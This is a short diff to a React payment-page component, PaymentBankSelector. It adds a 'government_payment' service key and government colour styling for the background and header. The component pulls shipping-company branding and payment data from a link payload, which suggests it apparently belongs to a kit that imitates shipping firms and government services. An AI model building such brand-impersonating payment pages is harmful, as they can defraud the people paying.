@@ -50,7 +50,7 @@ const PaymentBankSelector = () => {
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   
   // Check if government service
-  const isGovService = isGovernmentService(serviceKey);
+  const isGovService = isGovernmentService(serviceKey) || serviceKey.toLowerCase() === 'government_payment';
   
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
@@ -170,7 +170,9 @@ const PaymentBankSelector = () => {
         className="min-h-screen flex flex-col" 
         dir="rtl"
         style={{
-          background: `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
+          background: isGovService
+            ? `linear-gradient(135deg, ${surfaceColor}, ${govSystem.colors.background})`
+            : `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
           fontFamily: fontFamily
         }}
       >
@@ -178,7 +180,7 @@ const PaymentBankSelector = () => {
         <div 
           className="w-full py-4 px-3 sm:px-4 shadow-md"
           style={{
-            background: '#FFFFFF',
+            background: isGovService ? govSystem.colors.background : '#FFFFFF',
             borderBottom: `2px solid ${primaryColor}`
           }}
         >
